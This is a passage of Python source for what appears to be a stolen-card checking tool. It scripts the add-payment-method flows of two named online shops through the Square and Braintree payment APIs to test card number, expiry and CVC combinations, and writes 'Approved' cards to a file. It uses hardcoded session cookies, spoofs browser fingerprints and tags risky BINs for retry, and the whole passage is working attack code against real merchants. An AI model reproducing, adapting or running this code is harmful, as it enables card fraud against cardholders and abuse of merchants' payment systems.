		'sec-fetch-dest': 'document',
		'sec-fetch-mode': 'navigate',
		'sec-fetch-site': 'same-origin',
		'sec-fetch-user': '?1',
		'upgrade-insecure-requests': '1',
		'user-agent': user,
	}
	
	response = r.get('https://redwoodhempfarm.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
	add_nonce = (re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1))
	application_id = (re.search(r'"application_id":"(.*?)"', response.text).group(1))
	location_id = (re.search(r'"location_id":"(.*?)"', response.text).group(1))
	headers = {
		'authority': 'pci-connect.squareup.com',
		'accept': 'application/json',
		'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7,ko-KR;q=0.6,ko;q=0.5',
		'content-type': 'application/json; charset=utf-8',
		'origin': 'https://web.squarecdn.com',
		'referer': 'https://web.squarecdn.com/',
		'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'cross-site',
		'user-agent': user,
	}
	params = {
		'applicationId': application_id,
		'hostname': 'redwoodhempfarm.com',
		'locationId': location_id,
		'version': '1.54.6',
	}
	response = r.get('https://pci-connect.squareup.com/payments/hydrate', params=params, headers=headers)
	lol = user
	sessionId = (response.json()['sessionId'])
	headers = {
	    'authority': 'pci-connect.squareup.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/json; charset=utf-8',
	    # 'cookie': '_savt=e8c8852d-a9ee-4066-96a9-72e09507eab1; __cf_bm=NAldStg8TC.vZybXaTeaCiS1dWNKCoUYTNH1Q7BYByg-1714953286-1.0.1.1-PhXdVQ96B4jXlUlTfQYlaVDEkEG1sTLZfgq2_xFG.XKv8UDU6YrdEIeTUR6OzgRLUHiRjZN1ipxOro_K0tGbcQ',
	    'origin': 'https://web.squarecdn.com',
	    'referer': 'https://web.squarecdn.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	}
	
	params = {
	    '_': '1714953315593.5608',
	    'version': '1.55.1',
	}
	
	json_data = {
	    'client_id': application_id,
	    'location_id': location_id,
	    'payment_method_tracking_id': sess,
	    'session_id': sessionId,
	    'website_url': 'redwoodhempfarm.com',
	    'analytics_token': token,
	    'card_data': {
	        'billing_postal_code': '57255',
	        'cvv': cvc,
	        'exp_month': mm,
	        'exp_year': yy,
	        'number': n,
	    },
	}
	
	response = r.post(
	    'https://pci-connect.squareup.com/v2/card-nonce',
	    params=params,
	    cookies=r.cookies,
	    headers=headers,
	    json=json_data,
	)
	cnon = (response.json()['card_nonce'])
	headers = {
		'authority': 'connect.squareup.com',
		'accept': '*/*',
		'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7,ko-KR;q=0.6,ko;q=0.5',
		'content-type': 'application/json',
		'origin': 'https://connect.squareup.com',
		'referer': 'https://connect.squareup.com/payments/data/frame.html?referer=https%3A%2F%2Fredwoodhempfarm.com%2Fmy-account%2Fadd-payment-method%2F',
		'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-origin',
		'user-agent': user,
	}
	
	json_data = {
		'browser_fingerprint_by_version': [
			{
				'payload_json': '{"components":{"user_agent":"'+lol+'","language":"ar-AE","color_depth":24,"resolution":[892,412],"available_resolution":[892,412],"timezone_offset":-120,"session_storage":1,"local_storage":1,"open_database":1,"cpu_class":"unknown","navigator_platform":"Linux armv81","do_not_track":"unknown","regular_plugins":[],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[5,true,true],"js_fonts":["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana","Wingdings 2","Wingdings 3"]},"fingerprint":"db9863dc7f896661f366c859cadbaf09"}',
				'payload_type': 'fingerprint-v1',
			},
			{
				'payload_json': '{"components":{"language":"ar-AE","color_depth":24,"resolution":[892,412],"available_resolution":[892,412],"timezone_offset":-120,"session_storage":1,"local_storage":1,"open_database":1,"cpu_class":"unknown","navigator_platform":"Linux armv81","do_not_track":"unknown","regular_plugins":[],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[5,true,true],"js_fonts":["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana","Wingdings 2","Wingdings 3"]},"fingerprint":"c14cd05beab4e88696247c07be01a6dc"}',
				'payload_type': 'fingerprint-v1-sans-ua',
			},
		],
		'browser_profile': {
			'components': '{"user_agent":"'+lol+'","language":"ar-AE","color_depth":24,"resolution":[892,412],"available_resolution":[892,412],"timezone_offset":-120,"session_storage":1,"local_storage":1,"open_database":1,"cpu_class":"unknown","navigator_platform":"Linux armv81","do_not_track":"unknown","regular_plugins":[],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[5,true,true],"js_fonts":["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana","Wingdings 2","Wingdings 3"]}',
			'fingerprint': 'db9863dc7f896661f366c859cadbaf09',
			'timezone': '-120',
			'user_agent': user,
			'version': random_variable,
			'website_url': 'https://redwoodhempfarm.com/',
		},
		'client_id': application_id,
		'payment_source': cnon,
		'universal_token': {
			'token': location_id,
			'type': 'UNIT',
		},
		'verification_details': {
			'billing_contact': {
				'address_lines': [
					'',
					'',
				],
				'city': '',
				'country': 'US',
				'email': acc,
				'family_name': '',
				'given_name': '',
				'phone': '',
				'postal_code': '',
				'region': 'CA',
			},
			'intent': 'STORE',
		},
	}
	
	response = r.post(
		'https://connect.squareup.com/v2/analytics/verifications',
		headers=headers,
		json=json_data,
	)
	
	verf = (response.json()['token'])

	headers = {
		'authority': 'redwoodhempfarm.com',
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7,ko-KR;q=0.6,ko;q=0.5',
		'cache-control': 'max-age=0',
		'content-type': 'application/x-www-form-urlencoded',
		'origin': 'https://redwoodhempfarm.com',
		'referer': 'https://redwoodhempfarm.com/my-account/add-payment-method/',
		'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'document',
		'sec-fetch-mode': 'navigate',
		'sec-fetch-site': 'same-origin',
		'upgrade-insecure-requests': '1',
		'user-agent': user,
	}
	
	data = {
		'payment_method': 'square_credit_card',
		'wc-square-credit-card-card-type': 'VISA',
		'wc-square-credit-card-last-four': '0642',
		'wc-square-credit-card-exp-month': '4',
		'wc-square-credit-card-exp-year': '2024',
		'wc-square-credit-card-payment-nonce': cnon,
		'wc-square-credit-card-payment-postcode': '90011',
		'wc-square-credit-card-buyer-verification-token': verf,
		'wc-square-credit-card-tokenize-payment-method': 'true',
		'woocommerce-add-payment-method-nonce': add_nonce,
		'_wp_http_referer': '/my-account/add-payment-method/',
		'woocommerce_add_payment_method': '1',
	}
	
	response = r.post('https://redwoodhempfarm.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
	html_text=(response.text)
	pattern = r'Status code (.*?):'
	match = re.search(pattern, html_text)
	if match:
		result = match.group(1)
	else:
		if 'Payment method successfully added.' in html_text or 'Nice! New payment method' in html_text:
			with open('files.txt', '+a') as file:
				file.write(card+'\n')
			result = "1000: Approved"
		elif 'risk_threshold' in html_text:
			result = "RISK: Retry this BIN later."
		else:
			result = "RISK"
	if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result:
		with open('files.txt', '+a') as file:
			file.write(card+'\n')
		return 'Approved'
	else:
		return result
def au(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	lines='''mdjfjfud7379ero%40gmail.com%7C1725424450%7CLqYXNbcCErhLrqZdbmICaxU8oMOfov0PFKBGPf8XkoQ%7C104da8606bf4e3ae298a7c3266ff3dfacce2574089846817dded4ae772124135'''
	def up(big):
		cookies = {
		    '_gid': 'GA1.3.1249998794.1720519619',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-07-10%2010%3A41%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-07-10%2010%3A41%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'woocommerce_items_in_cart': '1',
    'woocommerce_cart_hash': '25bf01b44c2b59350d1270ee5a8a1455',
    'wordpress_logged_in_4d9c7ece763608b995b6637298409475': big,
    'wp_woocommerce_session_4d9c7ece763608b995b6637298409475': '109204%7C%7C1720780909%7C%7C1720777309%7C%7C00fed84c31df72f5b73baaab3bfb90c9',
    'PHPSESSID': 'fc641c458e935b4ca3cac6137eb80e25',
    'wfwaf-authcookie-fdddcad932b8083b61bd8da62850a450': '109204%7Cother%7Cread%7C2ac37e595edc42dd621980c7c24beb7a3d84a3ea7cdffb0e52830527587ffec9',
    'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2Fmy-account%2Fpayment-methods%2F',
    '_ga_N2L0XQK3XK': 'GS1.1.1720608090.2.1.1720608702.0.0.0',
    '_ga': 'GA1.3.755440368.1720519619',
    '_gat_gtag_UA_160773292_1': '1',
}
		
		headers = {
		    'authority': 'trade-chem.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    # 'cookie': '_gid=GA1.3.1249998794.1720519619; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-10%2010%3A41%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-10%2010%3A41%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; woocommerce_items_in_cart=1; woocommerce_cart_hash=25bf01b44c2b59350d1270ee5a8a1455; wordpress_logged_in_4d9c7ece763608b995b6637298409475=Memri%7C1721817927%7Cer4O9XfdO58seH5shnwJbJrTQhyd5NDhCmfomYyOYqr%7Cb17cede3ce7a1663fe3135b2d1eb9a3d12be56cea0f70dddac1f6a8453d73ed2; wp_woocommerce_session_4d9c7ece763608b995b6637298409475=109204%7C%7C1720780909%7C%7C1720777309%7C%7C00fed84c31df72f5b73baaab3bfb90c9; PHPSESSID=fc641c458e935b4ca3cac6137eb80e25; wfwaf-authcookie-fdddcad932b8083b61bd8da62850a450=109204%7Cother%7Cread%7C2ac37e595edc42dd621980c7c24beb7a3d84a3ea7cdffb0e52830527587ffec9; sbjs_session=pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2Fmy-account%2Fpayment-methods%2F; _ga_N2L0XQK3XK=GS1.1.1720608090.2.1.1720608702.0.0.0; _ga=GA1.3.755440368.1720519619; _gat_gtag_UA_160773292_1=1',
    'referer': 'https://trade-chem.co.uk/my-account/payment-methods/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}
		
		response = requests.get('https://trade-chem.co.uk/my-account/add-payment-method/', cookies=cookies, headers=headers)
		anonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
		enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
		dec = base64.b64decode(enc).decode('utf-8')
		au=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
		with open('gates.json', 'r') as json_file:
			existing_data = json.load(json_file)
# إضافة معلومات جديدة إلى البيانات الحالية
			new_data = {
				big : {
	  "nonce": anonce,
	  "au": au
				}
			}
	
			existing_data.update(new_data)
	
	# كتابة البيانات المحدثة إلى الملف
			with open('gates.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
	with open('fileccn.txt', 'r') as file:
		first_line = file.readline()
	lines = lines.strip().split('\n')
	while True:
		random_line_number = random.randint(0, len(lines) - 1)
		big = lines[random_line_number]
		if big == first_line:
			pass
		else:
			with open('gates.json', 'r') as file:
				json_data = json.load(file)
			try:
				anonce=json_data[big]['nonce']
				au=json_data[big]['au']
				break
			except Exception as e:
				for big in lines:
					try:
						up(big)
					except Exception as e:
						print(e)
	with open('fileccn.txt', 'w') as file:
		file.write(big)
	headers = {
	    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'af967d49-cb75-408a-9981-d8ac12760b8d',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'billingAddress': {
                    'postalCode': 'LE17 5NY',
                    'streetAddress': '323 E Pine St',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	try:
		tok = response.json()['data']['tokenizeCreditCard']['token']
	except:
		for big in lines:
			try:
				up(big)
			except Exception as e:
				print(e)
	headers = {
	    'authority': 'api.braintreegateway.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'content-type': 'application/json',
    'origin': 'https://trade-chem.co.uk',
    'referer': 'https://trade-chem.co.uk/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
    'amount': '0.00',
    'browserColorDepth': 24,
    'browserJavaEnabled': False,
    'browserJavascriptEnabled': True,
    'browserLanguage': 'ar',
    'browserScreenHeight': 800,
    'browserScreenWidth': 360,
    'browserTimeZone': -180,
    'deviceChannel': 'Browser',
    'additionalInfo': {
        'ipAddress': '197.63.41.253',
        'billingLine1': '323 E Pine St',
        'billingLine2': '',
        'billingCity': 'Deming',
        'billingState': '',
        'billingPostalCode': 'TW2 7LD',
        'billingCountryCode': 'GB',
        'billingPhoneNumber': '66464649',
        'billingGivenName': 'Mero',
        'billingSurname': 'AYman',
        'email': 'nacofew477@iteradev.com',
    },
    'bin': '434769',
    'dfReferenceId': '0_3badc98d-9c3b-4202-b7b9-8b1dea848bf7',
    'clientMetadata': {
        'requestedThreeDSecureVersion': '2',
        'sdkVersion': 'web/3.106.0',
        'cardinalDeviceDataCollectionTimeElapsed': 402,
        'issuerDeviceDataCollectionTimeElapsed': 9434,
        'issuerDeviceDataCollectionResult': True,
    },
    'authorizationFingerprint': au,
    'braintreeLibraryVersion': 'braintree/web/3.106.0',
    '_meta': {
        'merchantAppId': 'trade-chem.co.uk',
        'platform': 'web',
        'sdkVersion': '3.106.0',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': '522f5c93-bb3e-40ef-954d-6535bb76c94d',
    },
}
	
	response = requests.post(
	    f'https://api.braintreegateway.com/merchants/zkrjk5krj2dwnsgc/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
	    headers=headers,
	    json=json_data,
	)
	
	nonce = response.json()['paymentMethod']['nonce']
	import requests
	
	cookies = {
	    '_gid': 'GA1.3.1249998794.1720519619',
	    'woocommerce_items_in_cart': '1',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2024-07-09%2011%3A01%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2Fmy-account%2Fadd-payment-method%2F',
	    'sbjs_first_add': 'fd%3D2024-07-09%2011%3A01%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2Fmy-account%2Fadd-payment-method%2F',
	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
	    'wordpress_logged_in_4d9c7ece763608b995b6637298409475': big,
	    'wfwaf-authcookie-fdddcad932b8083b61bd8da62850a450': '18542%7Cother%7Cread%7Cda63ea485f161e51e2f5d352f2d2ebed2f92294855b45d5ead0e05261b8709e3',
	    'woocommerce_cart_hash': '7361ac106783123fb4637dfd2b17564b',
	    'wp_woocommerce_session_4d9c7ece763608b995b6637298409475': '18542%7C%7C1720692445%7C%7C1720688845%7C%7C9eaa525075e1ef1d990cad95c36b1034',
	    '_gat_gtag_UA_160773292_1': '1',
	    '_ga_N2L0XQK3XK': 'GS1.1.1720519618.1.1.1720523294.0.0.0',
	    '_ga': 'GA1.1.755440368.1720519619',
	    'sbjs_session': 'pgs%3D26%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2Fmy-account%2Fadd-payment-method%2F',
	}
	
	headers = {
	    'authority': 'trade-chem.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_gid=GA1.3.1249998794.1720519619; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-10%2010%3A41%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-10%2010%3A41%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; woocommerce_items_in_cart=1; woocommerce_cart_hash=25bf01b44c2b59350d1270ee5a8a1455; wordpress_logged_in_4d9c7ece763608b995b6637298409475=Memri%7C1721817927%7Cer4O9XfdO58seH5shnwJbJrTQhyd5NDhCmfomYyOYqr%7Cb17cede3ce7a1663fe3135b2d1eb9a3d12be56cea0f70dddac1f6a8453d73ed2; wp_woocommerce_session_4d9c7ece763608b995b6637298409475=109204%7C%7C1720780909%7C%7C1720777309%7C%7C00fed84c31df72f5b73baaab3bfb90c9; PHPSESSID=fc641c458e935b4ca3cac6137eb80e25; wfwaf-authcookie-fdddcad932b8083b61bd8da62850a450=109204%7Cother%7Cread%7C2ac37e595edc42dd621980c7c24beb7a3d84a3ea7cdffb0e52830527587ffec9; _gat_gtag_UA_160773292_1=1; _ga_N2L0XQK3XK=GS1.1.1720608090.2.1.1720609735.0.0.0; _ga=GA1.1.755440368.1720519619; sbjs_session=pgs%3D18%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2Fmy-account%2Fadd-payment-method%2F',
    'origin': 'https://trade-chem.co.uk',
    'referer': 'https://trade-chem.co.uk/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': nonce,
    'braintree_cc_device_data': '{"device_session_id":"4256a8eaeafb95f036feee32a4387f60","fraud_merchant_id":null,"correlation_id":"98a6b01c88173778e27db4bfa9b6d0b0"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/zkrjk5krj2dwnsgc/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/zkrjk5krj2dwnsgc"},"merchantId":"zkrjk5krj2dwnsgc","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"IE","currencyCode":"GBP","merchantIdentifier":"zkrjk5krj2dwnsgc","supportedNetworks":["visa","mastercard","amex"]},"kount":{"kountMerchantId":null},"challenges":[],"creditCards":{"supportedCardTypes":["American Express","Discover","Maestro","UK Maestro","MasterCard","Visa"]},"threeDSecureEnabled":true,"threeDSecure":{"cardinalAuthenticationJWT":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI5OGNjZjM1Ny1kZmFmLTRjYTEtOTdhNS0wZGZlNjQ4OGUyNjAiLCJpYXQiOjE3MjA2MDk1MjYsImV4cCI6MTcyMDYxNjcyNiwiaXNzIjoiNWQxY2Y1Njc2OTRlM2EyYjI0ZDdkY2U2IiwiT3JnVW5pdElkIjoiNWNhZTJmNjE1MTJjZmIwNzU0Yjk1YWZhIn0.6fI6iGjD8ZfqFsgILwvMHxa65JjZsoc51R88THhus9Y"},"androidPay":{"displayName":"Trade Chemicals 